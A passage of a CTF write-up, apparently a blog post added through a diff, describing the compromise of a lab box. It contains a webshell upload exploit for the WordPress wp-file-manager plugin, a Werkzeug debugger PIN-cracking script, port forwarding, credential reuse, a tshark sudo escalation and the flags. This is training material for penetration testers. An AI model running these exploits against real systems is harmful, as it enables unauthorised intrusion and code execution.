class="se">\r\n</span><span class="s">"</span>
+<span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">burp0_data</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"URL Shell: %s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=&lt;CMD&gt;"</span><span class="p">)</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+
+    <span class="n">cmd</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
+    <span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"%s/wp-content/plugins/wp-file-manager/lib/files/x.php?cmd=%s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">cmd</span><span class="p">)</span>
+    <span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"curl/7.68.0"</span><span class="p">,</span> <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"*/*"</span><span class="p">,</span> <span class="s">"Expect"</span><span class="p">:</span> <span class="s">"100-continue"</span><span class="p">,</span> <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">}</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">burp0_headers</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Makes a post request to <code class="language-plaintext highlighter-rouge">connector.minimal.php</code> that uploads a PNG containing a PHP webshell that can then execute commands given to the page <code class="language-plaintext highlighter-rouge">x.php</code> in GET parameters. Executing the exploit results in:</p>
+
+<p><img src="https://i.imgur.com/twStVFv.png" alt="picture"></p>
+
+<p>And as seen in the picture, the result of <code class="language-plaintext highlighter-rouge">id</code> can be seen to show the id of the www-data user meaning that code execution has been succcessful. Turning this into a reverse shell is trivial:</p>
+
+<p><img src="https://i.imgur.com/bpXklzN.png" alt="picture"></p>
+
+<p>Looking around the box, there are 2 users (Peter and Angus) but neither of their home directories are accessible. There are barely any processes running on the box aside from the web server and some application being ran by Angus:</p>
+
+<p><img src="https://i.imgur.com/oDwFNiD.png" alt="picture"></p>
+
+<p>Looking at the open ports:</p>
+
+<p><img src="https://i.imgur.com/clB4L5V.png" alt="picture"></p>
+
+<h2 id="port-forwarding-the-internal-web-server">
+<a class="anchor" href="#port-forwarding-the-internal-web-server" aria-hidden="true"><span class="octicon octicon-link"></span></a>Port forwarding the internal web server</h2>
+
+<p>The web server is on port 80, and there are two ports that could be the application Angus is running - port 5000 and port 3306 which could be a web server and an accompanying database server. Curling the port 5000 responds with:</p>
+
+<p><img src="https://i.imgur.com/GSFWQm1.png" alt="picture"></p>
+
+<p>Which means that it is indeed a web server. To enumerate this better, the port can be forwarded so that it can be accessed like a normal website. To do this, I’m using <a href="https://github.com/NHAS/reverse_ssh">reverse_ssh</a> as I can never remember the chisel syntax. After transferring the client binary to the box, it can be ran:</p>
+
+<p><img src="https://i.imgur.com/So8DBKg.png" alt="picture"></p>
+
+<p>So now the box can be accessed using ssh:</p>
+
+<p><img src="https://i.imgur.com/JwWrUhV.png" alt="picture"></p>
+
+<p>And port 5000 can be forwarded so it’s accessible on my machine also at port 5000:</p>
+
+<p><img src="https://i.imgur.com/Otp9Ve6.png" alt="picture"></p>
+
+<p>Now when I access <code class="language-plaintext highlighter-rouge">http://127.0.0.1:5000</code> I receive the page:</p>
+
+<p><img src="https://i.imgur.com/1KaM4IL.png" alt="picture"></p>
+
+<h2 id="enumerating-the-internal-page">
+<a class="anchor" href="#enumerating-the-internal-page" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumerating the internal page</h2>
+
+<p>The page is pretty empty and the only input field present is a simple search box that only filters the current items on screen. Directory fuzzing shows one endpoint:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -u http://127.0.0.1:5000/FUZZ -w /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt 
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://127.0.0.1:5000/FUZZ
+ :: Wordlist         : FUZZ: /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+console                 [Status: 200, Size: 1909, Words: 405, Lines: 52]
+:: Progress: [63087/63087] :: Job [1/1] :: 586 req/sec :: Duration: [0:02:17] :: Errors: 0 ::
+</code></pre></div></div>
+
+<p>And browsing to this endpoint shows a Werkzeug Debugger:</p>
+
+<p><img src="https://i.imgur.com/ULXd6Bj.png" alt="picture"></p>
+
+<h1 id="user">
+<a class="anchor" href="#user" aria-hidden="true"><span class="octicon octicon-link"></span></a>User</h1>
+
+<p>The Werkzeug debugger is hosted on the web app running as Angus. As Angus is running it, if code execution can be obtained through this debugger, we can get a shell as Angus!</p>
+
+<h2 id="werkzeug-pin-exploit">
+<a class="anchor" href="#werkzeug-pin-exploit" aria-hidden="true"><span class="octicon octicon-link"></span></a>Werkzeug PIN exploit</h2>
+
+<p>The debugger is protected by a pin. Werkzeug’s method for calculating the pin can be reverse as detailed in <a href="https://www.daehee.com/werkzeug-console-pin-exploit/">Dahee Park’s article</a> and shown on <a href="https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug">hacktricks</a>. To do this, access is needed to private information but since RCE has already been obtained, these values aren’t private anymore. Pulling the default script from the article:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="s">'web3_user'</span><span class="p">,</span><span class="c1"># username
+</span>	<span class="s">'flask.app'</span><span class="p">,</span><span class="c1"># modname
+</span>	<span class="s">'Flask'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>	<span class="s">'/usr/local/lib/python3.5/dist-packages/flask/app.py'</span> <span class="c1"># getattr(mod, '__file__', None),
+</span><span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="s">'279275995014060'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address
+</span>	<span class="s">'d4e6cb65d59544f3331ea0425dc555a1'</span><span class="c1"># get_machine_id(), /etc/machine-id
+</span><span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+		<span class="k">continue</span>
+	<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+		<span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'cookiesalt'</span><span class="p">)</span>
+<span class="c1">#h.update(b'shittysalt')
+</span>
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'pinsalt'</span><span class="p">)</span>
+	<span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">'%09d'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">rv</span> <span class="o">=</span> <span class="s">'-'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+						  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+			<span class="k">break</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="obtaining-werkzeug-pin-exploit-values">
+<a class="anchor" href="#obtaining-werkzeug-pin-exploit-values" aria-hidden="true"><span class="octicon octicon-link"></span></a>Obtaining Werkzeug PIN exploit values</h3>
+
+<p>The values that will need changing are:</p>
+
+<ul>
+  <li>username</li>
+  <li><code class="language-plaintext highlighter-rouge">getattr(mod, '__file__', None)</code></li>
+  <li><code class="language-plaintext highlighter-rouge">str(uuid.getnode()),  /sys/class/net/ens33/address</code></li>
+  <li><code class="language-plaintext highlighter-rouge">get_machine_id(), /etc/machine-id</code></li>
+</ul>
+
+<p>Since they are machine dependant. The user running the service is Angus. And the other values can be found as detailed in the article.</p>
+
+<h4 id="getattrmod-__file__-none">
+<a class="anchor" href="#getattrmod-__file__-none" aria-hidden="true"><span class="octicon octicon-link"></span></a><code class="language-plaintext highlighter-rouge">getattr(mod, '__file__', None)</code>
+</h4>
+
+<p>The value of <code class="language-plaintext highlighter-rouge">getattr(mod, '__file__', None)</code> is determined as the location of the flask <code class="language-plaintext highlighter-rouge">app.py</code> in <code class="language-plaintext highlighter-rouge">dist-packages</code> this can be found as follows:</p>
+
+<p><img src="https://i.imgur.com/Dx2fTqU.png" alt="picture"></p>
+
+<h4 id="struuidgetnode--sysclassnetens33address">
+<a class="anchor" href="#struuidgetnode--sysclassnetens33address" aria-hidden="true"><span class="octicon octicon-link"></span></a><code class="language-plaintext highlighter-rouge">str(uuid.getnode()),  /sys/class/net/ens33/address</code>
+</h4>
+
+<p>There are two ways to get this but since Werkzeug debugger uses <code class="language-plaintext highlighter-rouge">str(uuid.getnode())</code> to calculate this value, it’s probably safest to use the result of this command than it would be to convert the mac address of the interface into decimal. So this can be found with:</p>
+
+<p><img src="https://i.imgur.com/1NyKlqX.png" alt="picutre"></p>
+
+<h4 id="get_machine_id-etcmachine-id">
+<a class="anchor" href="#get_machine_id-etcmachine-id" aria-hidden="true"><span class="octicon octicon-link"></span></a><code class="language-plaintext highlighter-rouge">get_machine_id(), /etc/machine-id</code>
+</h4>
+
+<p>The <code class="language-plaintext highlighter-rouge">get_machine_id()</code> function exists inside the <code class="language-plaintext highlighter-rouge">__init__.py</code> file and is rather large and dependant on most of the python dependencies listed in that file so the easiest value to obtain is through <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> which can be obtained using:</p>
+
+<p><img src="https://i.imgur.com/IrOvbUR.png" alt="picture"></p>
+
+<h4 id="running-the-exploit">
+<a class="anchor" href="#running-the-exploit" aria-hidden="true"><span class="octicon octicon-link"></span></a>Running the exploit</h4>
+<p>The final values can be seen as:</p>
+
+<div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gh">diff defaultPINExploit.py pinExploit.py 
+</span><span class="p">4c4
+</span><span class="gd">&lt;       'web3_user',# username
+</span><span class="p">---
+</span><span class="gi">&gt;       'angus',# username
+</span><span class="p">7c7
+</span><span class="gd">&lt;       '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+</span><span class="p">---
+</span><span class="gi">&gt;       '/usr/local/lib/python3.8/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+</span><span class="p">11,12c11,12
+</span><span class="gd">&lt;       '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
+&lt;       'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
+</span><span class="p">---
+</span><span class="gi">&gt;       '158120054869863',# str(uuid.getnode()),  /sys/class/net/ens33/address
+&gt;       'c34dfd2441154d6797e82cf80cd8b166'# get_machine_id(), /etc/machine-id
+</span>
+</code></pre></div></div>
+
+<p>When the script is ran, a code is outputted: <code class="language-plaintext highlighter-rouge">283-149-359</code>. However this does not work:</p>
+
+<p><img src="https://i.imgur.com/eKxgmJ8.png" alt="picture"></p>
+
+<h3 id="fixing-the-issue">
+<a class="anchor" href="#fixing-the-issue" aria-hidden="true"><span class="octicon octicon-link"></span></a>Fixing the issue</h3>
+
+<p>After some unsuccessful debugging, and re-reading the hacktricks article, it appears that the value simply obtained from <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> might be incorrect with the article detailing:</p>
+
+<blockquote>
+  <p><code class="language-plaintext highlighter-rouge">get_machine_id()</code> read the value in <code class="language-plaintext highlighter-rouge">/etc/machine-id</code> or <code class="language-plaintext highlighter-rouge">/proc/sys/kernel/random/boot_id</code> and return directly if there is, sometimes it might be required to append a piece of information within <code class="language-plaintext highlighter-rouge">/proc/self/cgroup</code> that you find at the end of the first line (after the third slash)</p>
+</blockquote>
+
+<p>The contents of <code class="language-plaintext highlighter-rouge">/proc/self/cgroup</code> would be the contents for the bash process currently in use. But the Werkzeug debugger would use the information found in it’s cgroup file since <code class="language-plaintext highlighter-rouge">self</code> would refer to the process id of the flask application. The pid can be found with:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+----------          [SNIP]          ----------
+mysql       1001  0.2 10.3 1758208 412040 ?      Ssl  Jan05   0:43 /usr/sbin/mysqld
+root        1323  0.0  0.0      0     0 ?        S&lt;   Jan05   0:00 [loop3]
+root        1437  0.0  0.0      0     0 ?        S&lt;   Jan05   0:00 [loop4]
+root        1576  0.0  0.0      0     0 ?        S&lt;   Jan05   0:00 [loop5]
+www-data    2565  0.0  1.1 236560 47936 ?        S    Jan05   0:01 /usr/sbin/apache2 -k start
+uuidd       3850  0.0  0.0   7996  1088 ?        Ss   Jan05   0:00 /usr/sbin/uuidd --socket-activation
+root       32326  0.0  0.2 249540  9736 ?        Ssl  Jan05   0:00 /usr/lib/upower/upowerd
+angus      34668  0.0  0.7  46852 31020 ?        Ss   Jan05   0:00 /usr/bin/python3 app.py
+angus      34691  2.0  0.8 1071748 35192 ?       Sl   Jan05   2:07 /usr/bin/python3 /home/angus/stockchecker/app.py
+root       35723  0.0  0.0      0     0 ?        I    Jan05   0:03 [kworker/1:1-mpt_poll_0]
+www-data   36623  0.0  0.4 230640 19056 ?        S    Jan05   0:00 /usr/sbin/apache2 -k start
+
+----------          [SNIP]          ----------
+
+</code></pre></div></div>
+
+<p>So the process id is <code class="language-plaintext highlighter-rouge">34691</code> and viewing the cgroup file shows:</p>
+
+<p><img src="https://i.imgur.com/0HKezb2.png" alt="picture"></p>
+
+<p>So the value after the third brackets is what’s needed to be appended onto the end of the machine id. Meaning the final script is:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+	<span class="s">'angus'</span><span class="p">,</span><span class="c1"># username
+</span>	<span class="s">'flask.app'</span><span class="p">,</span><span class="c1"># modname
+</span>	<span class="s">'Flask'</span><span class="p">,</span><span class="c1"># getattr(app, '__name__', getattr(app.__class__, '__name__'))
+</span>	<span class="s">'/usr/local/lib/python3.8/dist-packages/flask/app.py'</span> <span class="c1"># getattr(mod, '__file__', None),
+</span><span class="p">]</span>
+
+<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+    
+	<span class="s">'158120054869863'</span><span class="p">,</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/ens33/address
+</span>	<span class="s">'c34dfd2441154d6797e82cf80cd8b166stockchecker.service'</span><span class="c1"># get_machine_id(), /etc/machine-id
+</span><span class="p">]</span>
+
+<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+		<span class="k">continue</span>
+	<span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+		<span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'cookiesalt'</span><span class="p">)</span>
+<span class="c1">#h.update(b'shittysalt')
+</span>
+<span class="n">cookie_name</span> <span class="o">=</span> <span class="s">'__wzd'</span> <span class="o">+</span> <span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+
+<span class="n">num</span> <span class="o">=</span> <span class="bp">None</span>
+<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="n">h</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="s">b'pinsalt'</span><span class="p">)</span>
+	<span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s">'%09d'</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+
+<span class="n">rv</span> <span class="o">=</span><span class="bp">None</span>
+<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+			<span class="n">rv</span> <span class="o">=</span> <span class="s">'-'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">].</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+						  <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+			<span class="k">break</span>
+	<span class="k">else</span><span class="p">:</span>
+		<span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+
+<span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="getting-user-shell">
+<a class="anchor" href="#getting-user-shell" aria-hidden="true"><span class="octicon octicon-link"></span></a>Getting user shell</h3>
+
+<p>Which gives a pin of: <code class="language-plaintext highlighter-rouge">266-586-701</code> which successfully unlocks the debugger!</p>
+
+<p><img src="https://i.imgur.com/SfvgcA1.png" alt="picture"></p>
+
+<p>So now a reverse shell can be obtained since os can be imported:</p>
+
+<p><img src="https://i.imgur.com/k7rOG6H.png" alt="picture"></p>
+
+<p>Which successfully executes giving a shell as Angus:</p>
+
+<p><img src="https://i.imgur.com/7EYEyS2.png" alt="picture"></p>
+
+<p>And the user flag can now be obtained:</p>
+
+<p><img src="https://i.imgur.com/DrBUjIH.png" alt="picture"></p>
+
+<p><code class="language-plaintext highlighter-rouge">WMG{goOd_OL_UN4U7H3N7ic473d_rc3_7HrOUgh_WorDPr355_pLUgIn2}</code></p>
+
+<h1 id="root">
+<a class="anchor" href="#root" aria-hidden="true"><span class="octicon octicon-link"></span></a>Root</h1>
+
+<p>The todo note in Angus’ home directory states:</p>
+
+<blockquote>
+  <p>Hey Angus,</p>
+
+  <p>We seem to be getting some TCP fragmentation issues on this machine, not sure why exactly.</p>
+
+  <p>Could you get some packet dumps made and we’ll review them at the next team meeting?</p>
+
+  <p>Thanks,</p>
+
+  <p>Peter</p>
+</blockquote>
+
+<p>Since capturing packets requires <code class="language-plaintext highlighter-rouge">CAP_NET_RAW</code> this is usually restricted so that only privileged users can perform these action (since sensitive data could be intercepted).</p>
+
+<h2 id="getting-angus-password">
+<a class="anchor" href="#getting-angus-password" aria-hidden="true"><span class="octicon octicon-link"></span></a>Getting Angus’ password</h2>
+
+<p>On this machine, Angus cannot run sudo:</p>
+
+<p><img src="https://i.imgur.com/oDKe7QR.png" alt="picture"></p>
+
+<p>And guessing some basic passwords doesn’t result in anything useful.</p>
+
+<h3 id="looking-for-a-password">
+<a class="anchor" href="#looking-for-a-password" aria-hidden="true"><span class="octicon octicon-link"></span></a>Looking for a password</h3>
+
+<p>Looking at the application Angus was running, there is a database password:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>
+<span class="kn">from</span> <span class="nn">flask_mysqldb</span> <span class="kn">import</span> <span class="n">MySQL</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">"MYSQL_HOST"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"127.0.0.1"</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">"MYSQL_USER"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"stockcheck"</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">"MYSQL_PASSWORD"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"57r0n6357_club_0n_c4mpu5"</span>
+<span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">"MYSQL_DB"</span><span class="p">]</span> <span class="o">=</span> <span class="s">"stockcheck"</span>
+
+<span class="n">mysql</span> <span class="o">=</span> <span class="n">MySQL</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
+
+
+<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">,</span> <span class="s">"GET"</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="n">query</span> <span class="o">=</span> <span class="s">"SELECT * FROM stock"</span>
+    <span class="n">arguments</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">if</span> <span class="n">request</span><span class="p">.</span><span class="n">method</span> <span class="o">==</span> <span class="s">"POST"</span> <span class="ow">and</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"product_name"</span><span class="p">)</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="n">query</span> <span class="o">=</span> <span class="s">"SELECT * FROM stock WHERE name LIKE %s"</span>
+        <span class="n">arguments</span> <span class="o">=</span> <span class="p">[</span><span class="s">"%"</span> <span class="o">+</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"product_name"</span><span class="p">)</span> <span class="o">+</span> <span class="s">"%"</span><span class="p">]</span>
+
+    <span class="n">cur</span> <span class="o">=</span> <span class="n">mysql</span><span class="p">.</span><span class="n">connection</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+    <span class="n">cur</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">arguments</span><span class="p">)</span>
+    <span class="n">rv</span> <span class="o">=</span> <span class="n">cur</span><span class="p">.</span><span class="n">fetchall</span><span class="p">()</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">"stock.html"</span><span class="p">,</span> <span class="n">products</span><span class="o">=</span><span class="n">rv</span><span class="p">)</span>
+
+
+<span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+</code></pre></div></div>
+
+<h3 id="password-reuse">
+<a class="anchor" href="#password-reuse" aria-hidden="true"><span class="octicon octicon-link"></span></a>Password reuse</h3>
+
+<p>After looking in the database to find no users or credentials table, I try to reuse the password as the password to Angus’ account:</p>
+
+<p><img src="https://i.imgur.com/Y3njQ07.png" alt="picture"></p>
+
+<h2 id="escalating-to-root">
+<a class="anchor" href="#escalating-to-root" aria-hidden="true"><span class="octicon octicon-link"></span></a>Escalating to root</h2>
+
+<p>Success! I now have Angus’ password so can try looking if Angus has any sudo privileges again:</p>
+
+<p><img src="https://i.imgur.com/6gwgPX3.png" alt="picture"></p>
+
+<p>So Angus can run tshark with sudo privileges. Looking at <a href="https://gtfobins.github.io/gtfobins/tshark/">GTFOBins for tshark</a>, there is a vulnerability to use tshark to get a system shell which could also be used here to get a shell as root:</p>
+
+<p><img src="https://i.imgur.com/fpWk6Ov.png" alt="picture"></p>
+
+<p>This should also work for the sudo privileges Angus has</p>
+
+<h3 id="exploiting-tshark-sudo-privileges">
+<a class="anchor" href="#exploiting-tshark-sudo-privileges" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploiting tshark sudo privileges</h3>
+
+<p>The exploit is as simple as copy pasting the code from the website into the terminal:</p>
+
+<p><img src="https://i.imgur.com/uuqvJCp.png" alt="picture"></p>
+
+<p>Success! A shell is spawned as root and the root flag can be retrieved:</p>
+
+<p><code class="language-plaintext highlighter-rouge">WMG{w417_1_5h0ULDn7_l37_P30pl3_5ud0_r4nD0m_Pr09r4mZ??}</code></p>
+
+            </div>
+
+            <!--- DIVIDING LINE -->
+            <hr />
+
+            <!-- POST TAGS -->
+            <div class="inline-tags">
+                <span>
+                    
+                        <a href="/tags/#CTF">#CTF&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Medium box">#Medium box&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#Wordpress">#Wordpress&nbsp;&nbsp;&nbsp;</a>
+                    
+                        <a href="/tags/#GTFOBins">#GTFOBins&nbsp;&nbsp;&nbsp;</a>
+                    
